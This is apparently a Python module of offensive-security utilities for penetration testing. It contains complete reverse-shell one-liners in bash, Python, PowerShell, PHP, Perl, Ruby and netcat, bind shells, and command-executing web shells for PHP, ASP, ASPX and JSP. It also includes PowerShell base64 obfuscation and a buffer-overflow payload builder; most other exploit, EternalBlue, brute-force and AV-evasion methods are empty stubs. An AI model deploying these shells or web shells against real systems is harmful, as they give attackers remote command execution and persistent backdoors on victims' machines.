#!/usr/bin/env python3
"""
Exploitation Utility Functions

Utilities for exploitation during authorized penetration testing.

Usage:
    from exploit_utils import PayloadGenerator, ExploitBuilder, ServiceExploiter
"""

import base64
import logging
from typing import Dict, List, Any

logger = logging.getLogger(__name__)


class PayloadGenerator:
    """Generate exploitation payloads."""

    SHELL_TEMPLATES = {
        'python': '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'''',
        'bash': '''bash -i >& /dev/tcp/{ip}/{port} 0>&1''',
        'powershell': '''$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()''',
        'php': '''php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
        'perl': '''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' ''',
        'ruby': '''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
        'nc': '''nc -e /bin/sh {ip} {port}''',
        'nc_mkfifo': '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'''
    }

    WEBSHELL_TEMPLATES = {
        'php': '''<?php if(isset($_REQUEST['cmd'])){{echo "<pre>";$cmd = ($_REQUEST['cmd']);system($cmd);echo "</pre>";die;}}?>''',
        'asp': '''<%eval request("cmd")%>''',
        'aspx': '''<%@ Page Language="C#" %><%System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd","/c " + Request["cmd"]));%>''',
        'jsp': '''<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'''
    }

    def generate_reverse_shell(self, ip: str, port: int, shell_type: str) -> str:
        """Generate reverse shell payload."""
        if shell_type not in self.SHELL_TEMPLATES:
            raise ValueError(f"Unknown shell type: {shell_type}")
        return self.SHELL_TEMPLATES[shell_type].format(ip=ip, port=port)

    def generate_bind_shell(self, port: int, shell_type: str) -> str:
        """Generate bind shell payload."""
        templates = {
            'python': f'''python -c 'import socket,os;s=socket.socket();s.bind(("0.0.0.0",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system("/bin/sh")' ''',
            'nc': f'''nc -lvnp {port} -e /bin/sh'''
        }
        return templates.get(shell_type, '')

    def generate_webshell(self, shell_type: str) -> str:
        """Generate web shell."""
        return self.WEBSHELL_TEMPLATES.get(shell_type, '')

    def generate_command_exec(self, command: str, shell_type: str) -> str:
        """Generate command execution payload."""
        templates = {
            'bash': f'{command}',
            'python': f"python -c 'import os; os.system(\"{command}\")'",
            'powershell': f'powershell -c "{command}"'
        }
        return templates.get(shell_type, command)

    def encode_payload(self, payload: str, encoding: str) -> str:
        """Encode payload."""
        if encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'hex':
            return payload.encode().hex()
        elif encoding == 'url':
            import urllib.parse
            return urllib.parse.quote(payload)
        return payload

    def obfuscate_payload(self, payload: str, shell_type: str) -> str:
        """Obfuscate payload."""
        if shell_type == 'powershell':
            # Basic PowerShell obfuscation
            encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
            return f'powershell -enc {encoded}'
        return payload

    def list_payload_types(self) -> List[str]:
        """List available payload types."""
        return list(self.SHELL_TEMPLATES.keys())


class ExploitBuilder:
    """Build and manage exploits."""

    def __init__(self, cve: str = None):
        self.cve = cve
        self.target_ip = None
        self.target_port = None
        self.callback_ip = None
        self.callback_port = None
        self.options = {}

    def set_target(self, ip: str, port: int = None):
        """Set target."""
        self.target_ip = ip
        self.target_port = port

    def set_callback(self, ip: str, port: int):
        """Set callback for reverse connections."""
        self.callback_ip = ip
        self.callback_port = port

    def set_option(self, name: str, value: Any):
        """Set exploit option."""
        self.options[name] = value

    def check(self) -> bool:
        """Check if target is vulnerable."""
        logger.info(f"Checking {self.target_ip} for {self.cve}")
        return False

    def generate(self) -> str:
        """Generate exploit code."""
        return f"# Exploit for {self.cve}\n# Target: {self.target_ip}"

    def execute(self) -> Dict[str, Any]:
        """Execute exploit."""
        logger.warning("Executing exploit - ensure you have authorization")
        return {
            'success': False,
            'session': None,
            'error': None
        }

    def get_poc(self) -> str:
        """Get proof of concept code."""
        return f"# PoC for {self.cve}"


class ServiceExploiter:
    """Exploit network services."""

    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port

    def check_vulnerabilities(self, vulns: List[str]) -> List[Dict[str, Any]]:
        """Check for multiple vulnerabilities."""
        results = []
        for vuln in vulns:
            results.append({
                'cve': vuln,
                'vulnerable': self.check_vulnerability(vuln)
            })
        return results

    def check_vulnerability(self, vuln: str) -> bool:
        """Check for specific vulnerability."""
        logger.info(f"Checking {self.target}:{self.port} for {vuln}")
        return False

    def exploit_ms17_010(self, callback_ip: str, callback_port: int) -> Dict[str, Any]:
        """Exploit MS17-010 (EternalBlue)."""
        logger.warning("Attempting MS17-010 exploitation")
        return {'success': False, 'session': None}

    def brute_force(self, userlist: List[str], passlist: List[str]) -> Dict[str, Any]:
        """Brute force service credentials."""
        logger.info(f"Brute forcing {self.target}:{self.port}")
        return {
            'success': False,
            'credentials': None
        }

    def check_anonymous_login(self) -> bool:
        """Check for anonymous login."""
        return False


class WebExploiter:
    """Exploit web application vulnerabilities."""

    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')

    def exploit_sqli(self, url: str, technique: str, dbms: str) -> Dict[str, Any]:
        """Exploit SQL injection."""
        logger.info(f"Exploiting SQLi on {url}")
        return {
            'database': None,
            'tables': [],
            'data': []
        }

    def exploit_command_injection(self, url: str, param: str, command: str) -> Dict[str, Any]:
        """Exploit command injection."""
        logger.info(f"Exploiting command injection on {url}")
        return {
            'success': False,
            'output': None
        }

    def exploit_lfi(self, url: str, target_file: str) -> Dict[str, Any]:
        """Exploit local file inclusion."""
        return {
            'success': False,
            'contents': None
        }

    def exploit_deserialization(self, url: str, payload_type: str, command: str) -> Dict[str, Any]:
        """Exploit insecure deserialization."""
        return {'success': False}

    def upload_shell(self, url: str, shell_type: str) -> Dict[str, Any]:
        """Upload web shell."""
        return {
            'success': False,
            'url': None
        }

    def trigger_shell(self, shell_url: str) -> bool:
        """Trigger uploaded shell."""
        return False


class BufferOverflowExploit:
    """Buffer overflow exploitation."""

    def __init__(self):
        self.offset = None
        self.bad_chars = []
        self.jmp_esp = None

    def find_offset(self, target: str, port: int, pattern_length: int) -> int:
        """Find offset using pattern."""
        logger.info(f"Finding offset with {pattern_length} byte pattern")
        return 0

    def find_bad_chars(self, target: str, port: int, offset: int) -> List[int]:
        """Find bad characters."""
        return [0x00]

    def find_jmp_esp(self, module: str = None) -> int:
        """Find JMP ESP address."""
        return 0

    def generate_shellcode(self, payload: str, lhost: str, lport: int,
                           bad_chars: List[int]) -> bytes:
        """Generate shellcode."""
        return b''

    def build_exploit(self, offset: int, eip: int,
                      nop_sled: int, shellcode: bytes) -> bytes:
        """Build complete exploit."""
        buffer = b'A' * offset
        buffer += eip.to_bytes(4, 'little')
        buffer += b'\x90' * nop_sled
        buffer += shellcode
        return buffer

    def execute(self, target: str, port: int, payload: bytes):
        """Execute buffer overflow exploit."""
        logger.warning(f"Executing BOF exploit against {target}:{port}")


class EvasionTechniques:
    """Security control evasion."""

    def encode_payload(self, payload: bytes, encoder: str, iterations: int = 1) -> bytes:
        """Encode payload."""
        logger.info(f"Encoding payload with {encoder} x{iterations}")
        return payload

    def obfuscate_powershell(self, script: str) -> str:
        """Obfuscate PowerShell script."""
        encoded = base64.b64encode(script.encode('utf-16-le')).decode()
        return f'powershell -enc {encoded}'

    def generate_amsi_bypass(self) -> str:
        """Generate AMSI bypass."""
        return "# AMSI bypass code"

    def evade_av(self, payload: bytes, technique: str) -> bytes:
        """Apply AV evasion technique."""
        logger.info(f"Applying {technique} evasion")
        return payload

    def encrypt_traffic(self, payload: bytes, key: str) -> bytes:
        """Encrypt payload for transport."""
        return payload

    def list_techniques(self) -> List[str]:
        """List available evasion techniques."""
        return [
            'shikata_ga_nai',
            'process_hollowing',
            'dll_injection',
            'syscall_direct',
            'unhook_ntdll'
        ]
